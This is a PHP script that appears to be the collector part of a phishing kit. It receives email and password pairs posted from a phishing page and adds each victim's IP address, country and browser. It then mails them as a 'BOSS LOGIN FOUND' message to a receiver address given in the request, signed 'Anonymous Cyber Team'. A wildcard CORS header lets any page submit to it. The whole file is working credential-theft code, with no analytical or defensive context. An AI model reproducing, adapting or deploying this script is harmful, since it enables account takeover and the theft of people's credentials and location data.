<?php
header('Access-Control-Allow-Origin: *');
header('Content-type: application/json');
$post = json_decode(file_get_contents("php://input"),true);

function getRealUserIp(){
    switch(true){
      case (!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
      case (!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
      case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];
      default : return $_SERVER['REMOTE_ADDR'];
    }
}

function visitor_country(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }else{
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null){
        $result = $ip_data-> geoplugin_countryName;
    }
    return $result;
}

function visitor_countryCode(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null){
        $result = $ip_data->geoplugin_countryCode;
    }
    return $result;
}

function visitor_continentCode(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }else{
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null){
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}

if($post && isset($post['password']) && isset($post['email'])){
    $data = array();
    $data['source'] = $post['source'];
    $data['email'] = $post['email'];
    $data['password'] = $post['password'];
    $data['to'] = $post['receiver'];
    $data['from'] = "no_reply@".$_SERVER['HTTP_HOST'];
    $data['fromName'] = "New Login!";
    $data['subject'] = "Important: New Leads Founds";
    $data['country'] = visitor_country();
    $data['countryCode'] = visitor_countryCode();
    $data['continentCode'] = visitor_continentCode();
    $data['ip'] = getRealUserIp();
    $data['browser'] = $_SERVER['HTTP_USER_AGENT'];
    $data['message'] = "
    <HTML>
        <BODY>
            <table>
                <tr><td>BOSS LOGIN FOUND </td></tr>
                <tr><td>source: ".$data['source']."</td></tr>
                <tr><td>email: ".$data['email']."</td></tr>
                <tr><td>Password: ".$data['password']."</td></tr>
                <tr><td>Browser: ".$data['browser']."</td></tr>
                <tr><td>IP: ".$data['country']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
                <tr><td>>Anonymous Cyber Team<</td></tr>
            </table>
        </BODY>
    </HTML>";    
    
    // Set content-type header for sending HTML email 
    $headers = "MIME-Version: 1.0" . "\r\n"; 
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
    
    // Additional headers 
    $headers .= 'From: '.$data['fromName'].'<'.$data['from'].'>' . "\r\n"; 
    
    // Send email 
    if(mail($data['to'], $data['subject'], $data['message'], $headers)){ 
        echo 'Email has sent successfully.';
        return true; 
    }else{ 
        echo 'Email sending failed.'; 
        return false;
    }
}
?>